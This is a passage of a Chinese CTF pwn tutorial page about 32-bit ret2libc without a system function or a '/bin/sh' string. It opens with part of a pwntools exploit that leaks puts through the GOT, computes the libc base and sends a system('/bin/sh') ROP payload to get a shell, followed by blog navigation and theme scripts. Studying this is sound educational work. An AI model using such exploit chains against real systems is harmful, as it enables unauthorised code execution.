class="string">&quot;main_plt_addr = &quot;</span>,<span class="built_in">hex</span>(main_plt_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(puts_plt_addr)</span><br><span class="line">payload += p32(main_plt_addr)</span><br><span class="line">payload += p32(puts_got_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_offset = <span class="number">0x0003e980</span></span><br><span class="line">puts_offset = <span class="number">0x00068FD0</span></span><br><span class="line">sh_offset = <span class="number">0x00017eaaa</span></span><br><span class="line"></span><br><span class="line">libc_base_addr = puts_addr - puts_offset </span><br><span class="line">sys_addr = libc_base_addr + sys_offset</span><br><span class="line">sh_addr = libc_base_addr + sh_offset </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(libc_base_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(sh_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&quot;AAAA&quot;</span>  </span><br><span class="line">payload += p32(sh_addr)  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/pwn-1-3-6-4-rop-ret2libc-3-system-bin-sh-1w8ckb8/assets/1596861272161-aebfca6f-05c8-487d-a31f-b4763fbfb557.png" alt="QQ截图20200808123424.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0_bin_sh%EF%BC%89/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0_bin_sh%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-05/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/" title="PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）"><img class="cover" src="https://picsum.photos/seed/blog-cover-04/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）</div></div><div class="info-2"><div class="info-item-1">PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF） 示例文件：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init&#x2F;hitcon-level5参考资料：https://cloud.tencent.com/developer/article/1345756https://blog.csdn.net/king_cpp_py&#x2F;article&#x2F;details&#x2F;79483152https://www.yuque.com/u239977/cbzkn3/vty6x0   感谢大佬@ILIB的帮助  首先说一下64位文件的传参方式： 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时， 前 6 个与前面一样， 但后面的依次 放入栈中，即和32位程序一样 123456比如：参数个数大于 7 个的时候H(a, b, c,...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-3%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%982/" title="PWN入门（1-3-6-3）-基本ROP-ret2libc实战2"><img class="cover" src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（1-3-6-3）-基本ROP-ret2libc实战2</div></div><div class="info-2"><div class="info-item-1">PWN入门（1-3-6-3）-基本ROP-ret2libc实战2 参考资料：https://wiki.x10sec.org/pwn/stackoverflow/basic_rop&#x2F;#2示例文件：https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2  将文件下载下来，检查一下文件的保护  拖入IDA中，查看一下代码：  发现危险栈溢出函数gets，同时在secure()函数中发现了system函数   但是并没有找到”&#x2F;bin&#x2F;sh”的字样，但是我们在bss段找到了一些可以利用的空间  我们可以在这个空间里写入“&#x2F;bin&#x2F;sh”  注意：由于程序开了NX保护，所以不可以向栈内写入内容  使用cycilc命令可以测出程序的栈偏移为112（省略此处的详细步骤） exp如下： 1234567891011from pwn import *bss_addr = 0x0804A080gets_plt = 0x0804...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-6-4%EF%BC%89-%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%983%EF%BC%88%E6%97%A0system%E5%87%BD%E6%95%B0%EF%BC%8C%E6%97%A0-bin-sh%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（1-3-6-4）-基本ROP-ret2libc实战3（无system函数，无&#x2F;bin&#x2F;sh）</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
